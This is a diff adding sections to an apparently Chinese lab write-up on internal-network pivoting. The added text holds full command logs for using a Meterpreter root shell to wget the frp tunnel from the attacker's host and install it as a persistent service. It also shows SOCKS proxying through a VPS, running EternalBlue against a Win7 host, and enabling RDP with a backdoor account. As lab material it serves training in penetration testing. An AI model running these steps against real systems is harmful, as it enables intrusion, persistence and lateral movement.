@@ -415,7 +415,7 @@ remote_port = 8000
 
 ![image-20211012175807108](assets/image-20211012175807108.png)
 
-
+​	
 
 启动msf，开启监听端口
 
@@ -550,7 +550,7 @@ msf6 exploit(multi/handler) >
 
 
 
-探测内网主机存活,可以看到`192.168.201.128`内网主机被探测出来
+探测内网主机存活,可以看到Centos:`192.168.201.128`内网主机被探测出来,但是Win7:`192.168.201.129`未被探测出来
 
 ```
 msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/discovery/arp_sweep
@@ -677,6 +677,497 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 ![image-20211012220153531](assets/image-20211012220153531.png)
 
 
+
+
+
+kali复制frp_0.37.1_linux_amd64.tar.gz到web服务路径下：/var/www/html 
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ sudo cp frp_0.37.1_linux_amd64.tar.gz /var/www/html            #复制frp到web服务路径下：/var/www/html  
+[sudo] kali 的密码：
+
+┌──(kali㉿kali)-[~]
+└─$ systemctl start apache2                                        #开启apache2服务
+==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
+启动“apache2.service”需要认证。
+Authenticating as: Kali,,, (kali)
+Password:
+==== AUTHENTICATION COMPLETE ===
+
+┌──(kali㉿kali)-[~]
+└─$
+```
+
+
+
+kali机器上：通过已经得到的反弹shell下，`wget http://192.168.111.132/frp_0.37.1_linux_amd64.tar.gz`下载
+
+```
+meterpreter > shell           #获得系统的shell
+Process 9697 created.
+Channel 1 created.
+id                           #id命令
+uid=0(root) gid=0(root) groups=0(root),994(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+wget http://192.168.111.132/frp_0.37.1_linux_amd64.tar.gz        #wget下载frp
+--2021-10-13 15:14:34--  http://192.168.111.132/frp_0.37.1_linux_amd64.tar.gz
+Connecting to 192.168.111.132:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9033483 (8.6M) [application/x-gzip]
+Saving to: 'frp_0.37.1_linux_amd64.tar.gz.1'
+
+     0K .......... .......... .......... .......... ..........  0% 46.4M 0s
+    50K .......... .......... .......... .......... ..........  1% 42.7M 0s
+   100K .......... .......... .......... .......... ..........  1%  335M 0s
+   150K .......... .......... .......... .......... ..........  2% 48.3M 0s
+   200K .......... .......... .......... .......... ..........  2%  199M 0s
+   250K .......... .......... .......... .......... ..........  3% 49.9M 0s
+   300K .......... .......... .......... .......... ..........  3% 92.5M 0s
+```
+
+
+
+![image-20211013151811453](assets/image-20211013151811453.png)
+
+
+
+```shell
+#解压frp_0.37.1_linux_amd64.tar.gz
+tar xf frp_0.37.1_linux_amd64.tar.gz
+exit                                        #退出
+```
+
+
+
+修改frpc.ini配置文件,并添加frpc为systemctl服务启动
+
+```shell
+meterpreter > cd frp_0.37.1_linux_amd64
+meterpreter > pwd
+/root/frp_0.37.1_linux_amd64
+meterpreter > ls
+Listing: /root/frp_0.37.1_linux_amd64
+=====================================
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+100644/rw-r--r--  11358     fil   2021-10-13 03:24:09 -0400  LICENSE
+100755/rwxr-xr-x  10579968  fil   2021-10-13 03:24:09 -0400  frpc
+100644/rw-r--r--  126       fil   2021-10-13 03:24:09 -0400  frpc.ini
+100644/rw-r--r--  9503      fil   2021-10-13 03:24:09 -0400  frpc_full.ini
+100755/rwxr-xr-x  13934592  fil   2021-10-13 03:24:10 -0400  frps
+100644/rw-r--r--  26        fil   2021-10-13 03:24:09 -0400  frps.ini
+100644/rw-r--r--  5010      fil   2021-10-13 03:24:09 -0400  frps_full.ini
+40755/rwxr-xr-x   88        dir   2021-10-13 03:24:09 -0400  systemd
+
+meterpreter > edit frpc.ini
+
+如下：
+[common]
+server_addr = 175.24.115.4
+server_port = 7000
+
+
+[socks9999]
+type = tcp
+remote_port = 9999
+plugin = socks5
+use_encryption = true
+use_compression = true
+```
+
+```shell
+meterpreter > mv frpc /usr/bin/frpc             #移动frpc客户端到/usr/bin/
+meterpreter > mkdir /etc/frp                   #创建/etc/frp文件夹
+Creating directory: /etc/frp                   
+meterpreter > mv frpc.ini /etc/frp/frpc.ini    #移动frpc.ini客户端配置文件到/etc/frp/
+meterpreter > mv ./systemd/frpc.service /usr/lib/systemd/system/frpc.service  #添加systemctl服务，
+meterpreter > shell                            #进入shell
+Process 10218 created.
+Channel 4 created.
+chmod +x /usr/bin/frpc                          #给frpc客户端执行权限
+systemctl start frpc                            #通过systemctl方式启动
+systemctl enable frpc							#开启自启动
+Created symlink from /etc/systemd/system/multi-user.target.wants/frpc.service to /usr/lib/systemd/system/frpc.service.
+exit                                            #退出
+```
+
+
+
+在Centos：192.168.111.138，验证是否开启：`systemctl status frpc`
+
+![image-20211013162322493](assets/image-20211013162322493.png)
+
+公网服务器上可以看到9999端口监听:`netstat -pantu |grep 9999`
+
+![image-20211013162340617](assets/image-20211013162340617.png)
+
+
+
+添加路由`route add 192.168.201.0 255.255.255.0 3`
+
+```shell
+meterpreter > background                           #保存会话
+[*] Backgrounding session 3...
+msf6 exploit(multi/handler) > sessions          #查看会话id
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                                       Connection
+  --  ----  ----                   -----------                                                                       ----------
+  3         meterpreter x64/linux  root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0) @ localhost.local...  192.168.111.132:4444 -> 192.168.111.132:34434 (::1)
+
+msf6 exploit(multi/handler) > route                 #查看路由，当前没有路由
+[*] There are currently no routes defined.
+msf6 exploit(multi/handler) > route add 192.168.201.0 255.255.255.0 3     #为192.168.201.0网段添加路由
+[*] Route added
+msf6 exploit(multi/handler) > route                #查看路由，添加成功
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.168.201.0      255.255.255.0      Session 3
+
+[*] There are currently no IPv6 routes defined.
+msf6 exploit(multi/handler) >
+
+```
+
+
+
+kali主机shell上：修改/etc/proxychains4.conf文件，添加如下一行：
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo vi /etc/proxychains4.conf
+[sudo] kali 的密码：
+
+添加如下一行：Centos的socks5代理映射到了公网ip：175.24.115.4的9999端口上
+socks5 175.24.115.4 9999
+
+```
+
+
+
+代理成功：`proxychains nmap 192.168.201.129`
+
+![image-20211013162804601](assets/image-20211013162804601.png)
+
+
+
+漏洞利用：
+
+通过代理启动msfdb
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ sudo proxychains msfdb run                       #启动msfdb                                                                                    1 ⨯
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[i] Database already started
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.1
+```
+
+```
+msf6 > use exploit/windows/smb/ms17_010_eternalblue                #使用永恒之蓝漏洞利用模块
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.201.129       #设置目标ip
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp   #正向shell
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 9988      #设置端口
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run                   #运行
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] DLL init: proxychains-ng 4.14
+
+[*] 192.168.201.129:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[proxychains] Strict chain  ...  175.24.115.4:9999  ...  192.168.201.129:445  ...  OK
+[proxychains] Strict chain  ...  175.24.115.4:9999  ...  192.168.201.129:135  ...  OK
+[+] 192.168.201.129:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.201.129:445   - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.201.129:445 - Connecting to target for exploitation.
+[proxychains] Strict chain  ...  175.24.115.4:9999  ...  192.168.201.129:445  ...  OK
+[+] 192.168.201.129:445 - Connection established for exploitation.
+```
+
+
+
+成功拿到Win7:`192.168.201.129`权限
+
+![image-20211013163243113](assets/image-20211013163243113.png)
+
+
+
+利用Win7:`192.168.201.129`的远程桌面服务：但是失败
+
+```shell
+meterpreter > background                           #保存会话
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/windows/manage/enable_rdp    #使用开启rdp模块
+msf6 post(windows/manage/enable_rdp) > set forward true                                #开启转发
+msf6 post(windows/manage/enable_rdp) > set lport 2323                                 #设置本地端口
+msf6 post(windows/manage/enable_rdp) > set username xuegod                          #设置用户名：xuegod
+msf6 post(windows/manage/enable_rdp) > set password 123456                          #设置密码:123456
+msf6 post(windows/manage/enable_rdp) > set SESSION 1                                #基于会话id:1
+msf6 post(windows/manage/enable_rdp) > run                                         #运行
+```
+
+```
+#将Win7的3389端口映射到本地kali的2323端口，即可通过本地的kali的2323端口，远程桌面到Win7
+meterpreter > portfwd add -L 192.168.111.132 -l 2323 -p 3389 -r 192.168.201.129
+
+rdp客户端连接
+┌──(kali㉿kali)-[~]
+└─$ rdesktop -g 1440x900 -u admin -p 123 192.168.111.132:2323
+```
+
+
+
+结果：
+
+![image-20211013173900027](assets/image-20211013173900027.png)
+
+
+
+远程桌面服务开启成功
+
+<img src="assets/image-20211013173601199.png" alt="image-20211013173601199" style="zoom:50%;" />
+
+
+
+用户未能创建成功
+
+<img src="assets/image-20211013173627262.png" alt="image-20211013173627262" style="zoom:50%;" />
+
+
+
+![image-20211013174252565](assets/image-20211013174252565.png)
+
+
+
+![image-20211013200754533](assets/image-20211013200754533.png)
+
+
+
+
+
+环境准备：
+
+kali:172.31.50.223
+
+桥接模式:
+
+<img src="assets/image-20211013210326459.png" alt="image-20211013210326459" style="zoom:50%;" />
+
+修改网卡配置文件：
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ sudo vi /etc/network/interfaces
+
+添加以下内容：
+auto eth0             
+iface eth0 inet static
+address 172.31.50.223    
+netmask 255.255.255.0  
+gateway 172.31.50.2    
+
+┌──(kali㉿kali)-[~]
+└─$ sudo vi /etc/resolv.conf
+
+添加以下内容：
+nameserver 114.114.114.114
+```
+
+<img src="assets/image-20211013210623143.png" alt="image-20211013210623143" style="zoom:50%;" />
+
+配置成功：
+
+<img src="assets/image-20211013210408146.png" alt="image-20211013210408146" style="zoom:50%;" />
+
+
+
+
+
+Centos:172.31.50.224、192.168.111.142
+
+新增一张网卡：桥接和NAT模式
+
+<img src="assets/image-20211013211252157.png" alt="image-20211013211252157" style="zoom:50%;" />
+
+
+
+修改网卡配置文件：
+
+```
+TYPE=Ethernet
+PROXY_METHOD=none
+BROWSER_ONLY=no
+BOOTPROTO=static                    #静态模式
+DEFROUTE=yes
+IPV4_FAILURE_FATAL=no
+IPV6INIT=yes
+IPV6_AUTOCONF=yes
+IPV6_DEFROUTE=yes
+IPV6_FAILURE_FATAL=no
+IPV6_ADDR_GEN_MODE=stable-privacy
+NAME=ens33                            
+UUID=0dd07099-51ba-4ac0-a3de-bd2a90d1f158
+DEVICE=ens33
+ONBOOT=yes                     #自动启动
+IPADDR=172.31.50.224           #ip
+NETMASK=255.255.255.0          #子网掩码
+GATEWAY=172.31.50.2            #网关
+DNS1=8.8.8.8                   #DNS      
+```
+
+<img src="assets/image-20211013211825242.png" alt="image-20211013211825242" style="zoom:50%;" />
+
+
+
+配置成功：
+
+<img src="assets/image-20211013211917602.png" alt="image-20211013211917602" style="zoom:50%;" />
+
+
+
+
+
+Win7-1:192.168.111.131、192.168.201.130
+
+新增一张网卡：NAT模式和仅主机模式
+
+<img src="assets/image-20211013212042766.png" alt="image-20211013212042766" style="zoom:50%;" />
+
+查看ip：`ipconfig`
+
+<img src="assets/image-20211013212240477.png" alt="image-20211013212240477" style="zoom:50%;" />
+
+
+
+配置成功：
+
+```shell
+C:\Users\admin>ping www.baidu.com
+
+正在 Ping www.wshifen.com [103.235.46.39] 具有 32 字节的数据:
+来自 103.235.46.39 的回复: 字节=32 时间=221ms TTL=128
+来自 103.235.46.39 的回复: 字节=32 时间=224ms TTL=128
+
+103.235.46.39 的 Ping 统计信息:
+    数据包: 已发送 = 2，已接收 = 2，丢失 = 0 (0% 丢失)，
+往返行程的估计时间(以毫秒为单位):
+    最短 = 221ms，最长 = 224ms，平均 = 222ms
+Control-C
+^C
+C:\Users\admin>ping 192.168.111.142
+
+正在 Ping 192.168.111.142 具有 32 字节的数据:
+来自 192.168.111.142 的回复: 字节=32 时间<1ms TTL=64
+来自 192.168.111.142 的回复: 字节=32 时间<1ms TTL=64
+
+192.168.111.142 的 Ping 统计信息:
+    数据包: 已发送 = 2，已接收 = 2，丢失 = 0 (0% 丢失)，
+往返行程的估计时间(以毫秒为单位):
+    最短 = 0ms，最长 = 0ms，平均 = 0ms
+Control-C
+^C
+C:\Users\admin>
+```
+
+<img src="assets/image-20211013212432054.png" alt="image-20211013212432054" style="zoom:50%;" />
+
+
+
+Win7-2:192.168.201.131
+
+克隆Win7-1
+
+<img src="assets/image-20211013212919876.png" alt="image-20211013212919876" style="zoom:50%;" />
+
+仅主机模式
+
+<img src="assets/image-20211013213059114.png" alt="image-20211013213059114" style="zoom:50%;" />
+
+
+
+
+
+配置成功：
+
+<img src="assets/image-20211013213139478.png" alt="image-20211013213139478" style="zoom:50%;" />
+
+
+
+
+
+环境搭建完成：
+
+<table>
+    <tr>
+        <td>主机</td> 
+        <td>IP</td> 
+        <td>网卡</td> 
+   	</tr>
+    <tr>
+        <td>Kali</td> 
+        <td>172.31.50.223</td> 
+        <td>桥接模式</td> 
+    </tr>
+       <tr>
+        <td>vps</td> 
+        <td>175.24.115.4</td> 
+        <td>公网服务器</td> 
+    </tr>
+    <tr>
+        <td rowspan="2">Centos</td>    
+        <td >172.31.50.224</td>
+        <td>桥接模式</td> 
+    </tr>
+    <tr>
+        <td >192.168.111.142</td>
+        <td>NAT模式</td> 
+    </tr>
+        <tr>
+        <td rowspan="2">Win7-1</td>    
+        <td >192.168.111.131</td>
+        <td>NAT模式</td> 
+    </tr>
+    <tr>
+        <td >192.168.201.130</td>
+        <td>仅主机模式</td> 
+    </tr>
+    <tr>
+        <td>Win7-2</td> 
+        <td>192.168.201.131</td> 
+        <td>仅主机模式</td> 
+    </tr>
+
+</table>
+
+
+
+
+
+
+
+
+
+![image-20211013210246200](assets/image-20211013210246200.png)
 
 
 
